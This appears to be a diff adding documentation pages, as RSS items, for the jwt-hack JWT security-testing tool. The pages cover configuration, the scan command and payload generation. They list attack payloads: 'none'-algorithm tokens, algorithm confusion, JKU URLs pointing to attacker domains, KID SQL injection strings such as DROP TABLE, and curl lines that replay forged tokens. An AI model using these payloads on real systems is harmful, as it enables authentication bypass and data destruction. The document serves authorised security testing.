+export JWT_HACK_DEFAULT_WORDLIST=&amp;quot;/path/to/wordlist.txt&amp;quot;
+
+# Default private key
+export JWT_HACK_DEFAULT_PRIVATE_KEY=&amp;quot;/path/to/key.pem&amp;quot;
+
+# Configuration file path
+export JWT_HACK_CONFIG=&amp;quot;/path/to/config.toml&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;command-line-priority&quot;&gt;Command Line Priority&lt;/h2&gt;
+&lt;p&gt;Configuration options follow this priority order (highest to lowest):&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Command line arguments&lt;/strong&gt; (highest priority)&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Environment variables&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Configuration file&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Built-in defaults&lt;/strong&gt; (lowest priority)&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Example:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Config file has: default_secret = &amp;quot;config-secret&amp;quot;
+# Environment has: JWT_HACK_DEFAULT_SECRET=&amp;quot;env-secret&amp;quot;
+# Command line: --secret=cli-secret
+
+jwt-hack encode &apos;{&amp;quot;sub&amp;quot;:&amp;quot;1234&amp;quot;}&apos; --secret=cli-secret
+# Uses: cli-secret (command line wins)
+
+jwt-hack encode &apos;{&amp;quot;sub&amp;quot;:&amp;quot;1234&amp;quot;}&apos;
+# Uses: env-secret (environment wins over config file)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;configuration-management&quot;&gt;Configuration Management&lt;/h2&gt;
+&lt;h3 id=&quot;generate-default-configuration&quot;&gt;Generate Default Configuration&lt;/h3&gt;
+&lt;p&gt;Create a default configuration file:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Create config directory if it doesn&apos;t exist
+mkdir -p ~/.config/jwt-hack
+
+# Create basic configuration
+cat &amp;gt; ~/.config/jwt-hack/config.toml &amp;lt;&amp;lt; EOF
+default_secret = &amp;quot;change-me-please&amp;quot;
+default_algorithm = &amp;quot;HS256&amp;quot;
+default_wordlist = &amp;quot;~/wordlists/common.txt&amp;quot;
+EOF
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;validate-configuration&quot;&gt;Validate Configuration&lt;/h3&gt;
+&lt;p&gt;Test your configuration:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Test with specific config file
+jwt-hack --config ~/.config/jwt-hack/config.toml encode &apos;{&amp;quot;test&amp;quot;:&amp;quot;payload&amp;quot;}&apos;
+
+# Verify settings are loaded correctly
+jwt-hack version  # Shows config file location if found
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;per-project-configuration&quot;&gt;Per-Project Configuration&lt;/h3&gt;
+&lt;p&gt;Use project-specific configuration files:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Project directory structure
+project/
+├── config.toml
+├── wordlists/
+└── keys/
+
+# Use project config
+cd project
+jwt-hack --config ./config.toml crack &amp;lt;TOKEN&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;configuration&quot;&gt;Advanced Configuration&lt;/h2&gt;
+&lt;h3 id=&quot;wordlist-collections&quot;&gt;Wordlist Collections&lt;/h3&gt;
+&lt;p&gt;Organize multiple wordlists:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-toml hljs&quot;&gt;[wordlists]
+common = &amp;quot;/wordlists/common-passwords.txt&amp;quot;
+large = &amp;quot;/wordlists/rockyou.txt&amp;quot;
+custom = &amp;quot;/wordlists/app-specific.txt&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;key-management&quot;&gt;Key Management&lt;/h3&gt;
+&lt;p&gt;Configure multiple key files:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-toml hljs&quot;&gt;[keys]
+rsa_private = &amp;quot;/keys/rsa-private.pem&amp;quot;
+rsa_public = &amp;quot;/keys/rsa-public.pem&amp;quot;
+ecdsa_private = &amp;quot;/keys/ecdsa-private.pem&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;performance-tuning&quot;&gt;Performance Tuning&lt;/h3&gt;
+&lt;p&gt;Configure performance settings:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-toml hljs&quot;&gt;[performance]
+default_concurrency = 8
+max_memory_usage = &amp;quot;1GB&amp;quot;
+timeout = 300
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;security-considerations&quot;&gt;Security Considerations&lt;/h2&gt;
+&lt;h3 id=&quot;sensitive-data-in-config&quot;&gt;Sensitive Data in Config&lt;/h3&gt;
+&lt;p&gt;Avoid storing sensitive secrets in configuration files:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-toml hljs&quot;&gt;# BAD: Hardcoded secret in config
+default_secret = &amp;quot;super-secret-key&amp;quot;
+
+# BETTER: Reference to secure location
+default_secret_file = &amp;quot;/secure/path/secret.txt&amp;quot;
+
+# BEST: Use environment variables for secrets
+# default_secret loaded from JWT_HACK_DEFAULT_SECRET
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;file-permissions&quot;&gt;File Permissions&lt;/h3&gt;
+&lt;p&gt;Secure configuration files:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Set restrictive permissions
+chmod 600 ~/.config/jwt-hack/config.toml
+
+# Verify permissions
+ls -la ~/.config/jwt-hack/config.toml
+# Should show: -rw------- (user read/write only)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;configuration-validation&quot;&gt;Configuration Validation&lt;/h3&gt;
+&lt;p&gt;JWT-HACK validates configuration on startup:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Checks file paths exist&lt;/li&gt;
+&lt;li&gt;Validates algorithm names&lt;/li&gt;
+&lt;li&gt;Warns about insecure settings&lt;/li&gt;
+&lt;li&gt;Reports configuration errors clearly&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;troubleshooting&quot;&gt;Troubleshooting&lt;/h2&gt;
+&lt;h3 id=&quot;configuration-not-loading&quot;&gt;Configuration Not Loading&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Check if config file exists
+ls -la ~/.config/jwt-hack/config.toml
+
+# Test with explicit config path
+jwt-hack --config ~/.config/jwt-hack/config.toml version
+
+# Enable debug output
+JWT_HACK_DEBUG=true jwt-hack encode &apos;{&amp;quot;test&amp;quot;:&amp;quot;1&amp;quot;}&apos;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;invalid-configuration&quot;&gt;Invalid Configuration&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Check configuration syntax
+toml-lint ~/.config/jwt-hack/config.toml
+
+# Test configuration loading
+jwt-hack --config ~/.config/jwt-hack/config.toml version
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;permission-issues&quot;&gt;Permission Issues&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Fix configuration directory permissions
+chmod 755 ~/.config/jwt-hack
+
+# Fix configuration file permissions
+chmod 600 ~/.config/jwt-hack/config.toml
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    <item>
+      <title>Scan Command</title>
+      <link>http://localhost:3000/usage/commands/scan/</link>
+      <guid>http://localhost:3000/usage/commands/scan/</guid>
+      <description>&lt;p&gt;The &lt;code&gt;scan&lt;/code&gt; command runs a fast, heuristic assessment of a JWT. It decodes the token, performs common weakness checks, optionally tries weak secrets for HS* tokens, and can print example attack payloads for follow‑up testing.&lt;/p&gt;
+&lt;h2 id=&quot;basic-usage&quot;&gt;Basic Usage&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;jwt-hack scan &amp;lt;TOKEN&amp;gt; [OPTIONS]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;what-the-scanner-checks&quot;&gt;What the Scanner Checks&lt;/h2&gt;
+&lt;p&gt;The current scanner performs the following checks:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Token information
+&lt;ul&gt;
+&lt;li&gt;Displays algorithm and &lt;code&gt;typ&lt;/code&gt; from the header.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Timestamp checks
+&lt;ul&gt;
+&lt;li&gt;Presence of &lt;code&gt;exp&lt;/code&gt; and whether it is expired.&lt;/li&gt;
+&lt;li&gt;Presence of &lt;code&gt;iat&lt;/code&gt; and &lt;code&gt;nbf&lt;/code&gt; (no ordering validation between &lt;code&gt;iat&lt;/code&gt;, &lt;code&gt;nbf&lt;/code&gt;, &lt;code&gt;exp&lt;/code&gt;).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&amp;quot;none&amp;quot; algorithm usage
+&lt;ul&gt;
+&lt;li&gt;Flags if the token actually uses the &lt;code&gt;none&lt;/code&gt; algorithm.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Weak/guessable secret (HS* only)
+&lt;ul&gt;
+&lt;li&gt;For HMAC tokens (HS256/384/512), tries a limited secret list (built‑in or provided wordlist).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Algorithm confusion indicator
+&lt;ul&gt;
+&lt;li&gt;Flags asymmetric algorithms (RS/ES/PS/EdDSA) as &amp;quot;needs testing&amp;quot; for alg-confusion risks.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Header misuse indicators
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;kid&lt;/code&gt; presence (possible SQL/path injection surfaces).&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;jku&lt;/code&gt; / &lt;code&gt;x5u&lt;/code&gt; presence (possible URL spoofing / remote JWKS risks).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Attack payload suggestions (optional)
+&lt;ul&gt;
+&lt;li&gt;Prints example payloads for detected issues: &lt;code&gt;none&lt;/code&gt;, &lt;code&gt;alg_confusion&lt;/code&gt;, &lt;code&gt;kid_sql&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Notes:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;JWE (5-part) tokens are not supported by &lt;code&gt;scan&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Compressed JWT payloads (&lt;code&gt;zip: &amp;quot;DEF&amp;quot;&lt;/code&gt;) are decoded but not separately highlighted as a finding.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;options&quot;&gt;Options&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Skip cracking and payload generation
+jwt-hack scan &amp;lt;TOKEN&amp;gt; --skip-crack --skip-payloads
+
+# Provide a wordlist for weak-secret checks (HS* only)
+jwt-hack scan &amp;lt;TOKEN&amp;gt; -w /path/to/wordlist.txt
+
+# Limit secret attempts (useful for CI or quick runs)
+jwt-hack scan &amp;lt;TOKEN&amp;gt; --max-crack-attempts 100
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;--skip-crack&lt;/code&gt; — Skip dictionary-based weak-secret checks (only affects HS*).&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--skip-payloads&lt;/code&gt; — Skip the payload suggestion/generation section.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-w, --wordlist &amp;lt;FILE&amp;gt;&lt;/code&gt; — Wordlist for weak-secret detection. If not provided or cannot be opened, a small built‑in list is used.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--max-crack-attempts &amp;lt;N&amp;gt;&lt;/code&gt; — Limit tested secrets (default: 100).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Tip: Large wordlists can significantly increase scan time. Use &lt;code&gt;--max-crack-attempts&lt;/code&gt; to cap work during triage or CI.&lt;/p&gt;
+&lt;h2 id=&quot;examples&quot;&gt;Examples&lt;/h2&gt;
+&lt;h3 id=&quot;quick-full-scan&quot;&gt;Quick Full Scan&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;jwt-hack scan eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.PAYLOAD.SIGN
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;scan-with-wordlist&quot;&gt;Scan With Wordlist&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;jwt-hack scan &amp;lt;TOKEN&amp;gt; -w samples/wordlist.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;fast-heuristics-only-no-cracking-no-payloads&quot;&gt;Fast Heuristics Only (no cracking, no payloads)&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;jwt-hack scan &amp;lt;TOKEN&amp;gt; --skip-crack --skip-payloads
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;ci-friendly-scan-limit-attempts&quot;&gt;CI-Friendly Scan (limit attempts)&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;jwt-hack scan &amp;lt;TOKEN&amp;gt; -w rockyou.txt --max-crack-attempts 200
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;typical-output&quot;&gt;Typical Output&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&quot;language-text hljs&quot;&gt;━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  JWT VULNERABILITY SCANNER
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+━━━ Token Information ━━━
+Algorithm: HS256
+Type: JWT
+
+━━━ Scan Results ━━━
+
+✓ None Algorithm [INFO]
+  Token does not use &apos;none&apos; algorithm
+
+✗ Weak Secret [CRITICAL]
+  Token uses weak/common secret: &apos;secret&apos;
+
+✓ Algorithm Confusion [INFO]
+  Token uses symmetric algorithm, not vulnerable to typical alg confusion
+
+✗ Token Expiration [MEDIUM]
+  Missing &apos;nbf&apos; (not before) claim; Missing &apos;iat&apos; (issued at) claim
+
+✗ Missing Claims [LOW]
+  Missing recommended claims: aud, iss, jti
+
+✓ Kid Header Injection [INFO]
+  No &apos;kid&apos; header present
+
+✓ JKU/X5U Header [INFO]
+  No JKU/X5U headers present
+
+━━━ Summary ━━━
+Total Vulnerabilities Found: 3
+  1 Critical
+  1 Medium
+  1 Low
+
+⚠️  Review the vulnerabilities above and consider generating attack payloads.
+
+━━━ Generating Attack Payloads ━━━
+... (example payloads for &apos;none&apos;, &apos;alg_confusion&apos;, &apos;kid_sql&apos;)
+&lt;/code&gt;&lt;/pre&gt;&lt;li&gt;Secret cracking runs only when the algorithm is HMAC (HS256/384/512). For non‑HS* tokens, this check is skipped as &amp;quot;Not applicable&amp;quot;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Algorithm confusion is heuristic
+&lt;ul&gt;
+&lt;li&gt;Asymmetric algorithms are flagged as &amp;quot;needs testing&amp;quot; (High) to prompt follow‑up validation; it is not a confirmed vulnerability by itself.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;JKU/X5U payloads
+&lt;ul&gt;
+&lt;li&gt;The scanner flags the presence of these headers, but the current payload generation prints examples for &lt;code&gt;none&lt;/code&gt;, &lt;code&gt;alg_confusion&lt;/code&gt;, and &lt;code&gt;kid_sql&lt;/code&gt;. It does not print &lt;code&gt;jku/x5u&lt;/code&gt; payload examples in this command&apos;s output.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;recommended-workflow&quot;&gt;Recommended Workflow&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;Run a quick scan to triage:
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;jwt-hack scan &amp;lt;TOKEN&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;li&gt;If a weak secret is suspected (HS*):
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;jwt-hack crack -w &amp;lt;WORDLIST&amp;gt; &amp;lt;TOKEN&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;li&gt;If payloads are suggested:
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;jwt-hack payload &amp;lt;TOKEN&amp;gt; --target=all
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;li&gt;Verify any hypotheses:
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;jwt-hack verify &amp;lt;TOKEN&amp;gt; --secret=&amp;lt;KEY or PUBLIC_KEY&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&quot;troubleshooting&quot;&gt;Troubleshooting&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;JWE input: &lt;code&gt;scan&lt;/code&gt; expects a JWT (3 parts). 5‑part JWE tokens are not supported.&lt;/li&gt;
+&lt;li&gt;If the scan terminates early, ensure the token uses the standard &lt;code&gt;&amp;lt;header&amp;gt;.&amp;lt;payload&amp;gt;.&amp;lt;signature&amp;gt;&lt;/code&gt; format.&lt;/li&gt;
+&lt;li&gt;For faster results, use &lt;code&gt;--skip-crack&lt;/code&gt; or set &lt;code&gt;--max-crack-attempts&lt;/code&gt; to a small number.&lt;/li&gt;
+&lt;li&gt;Wordlist path errors: provide an absolute path or a path relative to your project root.&lt;/li&gt;
+&lt;li&gt;Usage hint (shown on errors):
+&lt;pre&gt;&lt;code&gt;e.g jwt-hack scan {JWT_CODE} [--skip-crack] [--skip-payloads] [-w wordlist.txt]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;security-notes&quot;&gt;Security Notes&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Only scan tokens you own or have permission to test.&lt;/li&gt;
+&lt;li&gt;Treat discovered secrets as sensitive; handle and store them securely.&lt;/li&gt;
+&lt;li&gt;Use findings to harden your systems (strong secrets, enforce &lt;code&gt;exp&lt;/code&gt;, avoid risky headers, validate key sources).&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    <item>
+      <title>Payload Command</title>
+      <link>http://localhost:3000/usage/commands/payload/</link>
+      <guid>http://localhost:3000/usage/commands/payload/</guid>
+      <description>&lt;p&gt;The &lt;code&gt;payload&lt;/code&gt; command generates various JWT attack payloads for security testing and vulnerability assessment.&lt;/p&gt;
+&lt;h2 id=&quot;basic-usage&quot;&gt;Basic Usage&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;jwt-hack payload &amp;lt;TOKEN&amp;gt; [OPTIONS]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;attack-payload-types&quot;&gt;Attack Payload Types&lt;/h2&gt;
+&lt;h3 id=&quot;none-algorithm-attack&quot;&gt;None Algorithm Attack&lt;/h3&gt;
+&lt;p&gt;Remove signature verification requirement:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;jwt-hack payload &amp;lt;TOKEN&amp;gt; --target=none
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Generates payloads with:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;alg: &amp;quot;none&amp;quot;&lt;/code&gt; (lowercase)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;alg: &amp;quot;None&amp;quot;&lt;/code&gt; (capitalized)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;alg: &amp;quot;NONE&amp;quot;&lt;/code&gt; (uppercase)&lt;/li&gt;
+&lt;li&gt;Various case combinations&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;algorithm-confusion-attack&quot;&gt;Algorithm Confusion Attack&lt;/h3&gt;
+&lt;p&gt;Convert RSA tokens to HMAC using public key as secret:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;jwt-hack payload &amp;lt;RSA_TOKEN&amp;gt; --target=alg_confusion
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Creates payloads that:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Change algorithm from RS256 to HS256&lt;/li&gt;
+&lt;li&gt;Use public key content as HMAC secret&lt;/li&gt;
+&lt;li&gt;Test algorithm substitution vulnerabilities&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;jkux5u-url-attacks&quot;&gt;JKU/X5U URL Attacks&lt;/h3&gt;
+&lt;p&gt;Manipulate JSON Web Key URLs:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Basic JKU/X5U attack
+jwt-hack payload &amp;lt;TOKEN&amp;gt; --target=jku
+
+# With trusted domain bypass
+jwt-hack payload &amp;lt;TOKEN&amp;gt; --jwk-trust=trusted.com --jwk-attack=evil.com
+
+# Custom protocol and attack domain
+jwt-hack payload &amp;lt;TOKEN&amp;gt; --jwk-attack=attacker.com --jwk-protocol=http
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Generates payloads with:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Malicious JKU URLs pointing to attacker-controlled keys&lt;/li&gt;
+&lt;li&gt;X5U URLs for certificate chain manipulation&lt;/li&gt;
+&lt;li&gt;Domain bypass techniques&lt;/li&gt;
+&lt;li&gt;Protocol downgrade attacks&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;kid-sql-injection&quot;&gt;KID SQL Injection&lt;/h3&gt;
+&lt;p&gt;Inject SQL payloads in Key ID field:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;jwt-hack payload &amp;lt;TOKEN&amp;gt; --target=kid_sql
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Generates payloads with SQL injection vectors:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&apos; OR 1=1--&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&apos;; DROP TABLE users;--&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&apos; UNION SELECT null--&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Time-based blind SQL injection payloads&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;x5c-certificate-injection&quot;&gt;X5C Certificate Injection&lt;/h3&gt;
+&lt;p&gt;Inject malicious certificate chains:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;jwt-hack payload &amp;lt;TOKEN&amp;gt; --target=x5c
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Creates payloads with:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Malicious certificate chains&lt;/li&gt;
+&lt;li&gt;Self-signed certificates&lt;/li&gt;
+&lt;li&gt;Certificate with custom extensions&lt;/li&gt;
+&lt;li&gt;Chain validation bypass attempts&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;cty-content-type-attacks&quot;&gt;CTY Content Type Attacks&lt;/h3&gt;
+&lt;p&gt;Manipulate content type headers for XXE and deserialization:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;jwt-hack payload &amp;lt;TOKEN&amp;gt; --target=cty
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Generates payloads with content types for:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;text/xml&lt;/code&gt; - XML External Entity (XXE) attacks&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;application/xml&lt;/code&gt; - XML processing vulnerabilities&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;application/x-java-serialized-object&lt;/code&gt; - Java deserialization&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;application/json+x-jackson-smile&lt;/code&gt; - Jackson deserialization&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;generate-all-payload-types&quot;&gt;Generate All Payload Types&lt;/h2&gt;
+&lt;p&gt;Create comprehensive attack payload set:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Generate all attack types
+jwt-hack payload &amp;lt;TOKEN&amp;gt; --target=all
+
+# All attacks with custom domains
+jwt-hack payload &amp;lt;TOKEN&amp;gt; --target=all --jwk-attack=evil.com --jwk-trust=trusted.com
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;command-options&quot;&gt;Command Options&lt;/h2&gt;
+&lt;h3 id=&quot;required&quot;&gt;Required&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;TOKEN&amp;gt;&lt;/code&gt; - Base JWT token for payload generation&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;target-selection&quot;&gt;Target Selection&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;--target &amp;lt;TYPE&amp;gt;&lt;/code&gt; - Payload types: &lt;code&gt;all&lt;/code&gt;, &lt;code&gt;none&lt;/code&gt;, &lt;code&gt;jku&lt;/code&gt;, &lt;code&gt;x5u&lt;/code&gt;, &lt;code&gt;alg_confusion&lt;/code&gt;, &lt;code&gt;kid_sql&lt;/code&gt;, &lt;code&gt;x5c&lt;/code&gt;, &lt;code&gt;cty&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;jkux5u-attack-options&quot;&gt;JKU/X5U Attack Options&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;--jwk-trust &amp;lt;DOMAIN&amp;gt;&lt;/code&gt; - Trusted domain for bypass techniques&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--jwk-attack &amp;lt;DOMAIN&amp;gt;&lt;/code&gt; - Attacker-controlled domain&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--jwk-protocol &amp;lt;PROTOCOL&amp;gt;&lt;/code&gt; - Protocol to use (http/https, default: https)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;output-format&quot;&gt;Output Format&lt;/h2&gt;
+&lt;p&gt;Payloads are displayed with:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Attack type identifier&lt;/li&gt;
+&lt;li&gt;Modified JWT token&lt;/li&gt;
+&lt;li&gt;Description of the attack vector&lt;/li&gt;
+&lt;li&gt;Usage recommendations&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Example output:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;🎯 None Algorithm Attack Payloads:
+
+[1] None Algorithm (lowercase)
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0In0.
+
+[2] None Algorithm (capitalized)
+eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0In0.
+
+[3] None Algorithm (uppercase)
+eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0In0.
+&lt;/code&gt;&lt;/pre&gt;2 id=&quot;attack-scenarios&quot;&gt;Attack Scenarios&lt;/h2&gt;
+&lt;h3 id=&quot;testing-authentication-bypass&quot;&gt;Testing Authentication Bypass&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Test if application accepts unsigned tokens
+jwt-hack payload &amp;lt;TOKEN&amp;gt; --target=none
+
+# Test each generated payload:
+curl -H &amp;quot;Authorization: Bearer &amp;lt;NONE_PAYLOAD&amp;gt;&amp;quot; https://api.example.com/user
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;algorithm-confusion-testing&quot;&gt;Algorithm Confusion Testing&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Generate algorithm confusion payloads
+jwt-hack payload &amp;lt;RSA_TOKEN&amp;gt; --target=alg_confusion
+
+# Test with public key content as HMAC secret
+curl -H &amp;quot;Authorization: Bearer &amp;lt;CONFUSED_PAYLOAD&amp;gt;&amp;quot; https://api.example.com/admin
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;key-url-manipulation&quot;&gt;Key URL Manipulation&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash hljs&quot;&gt;# Test JKU/X5U URL attacks
+jwt-hack payload &amp;lt;TOKEN&amp;gt; --target=jku --jwk-attack=attacker.com
+
+# Host malicious JWK at attacker.com/keys.json
+# Test if application fetches keys from attacker URL
+&lt;/code&gt;&lt;/pre&gt;
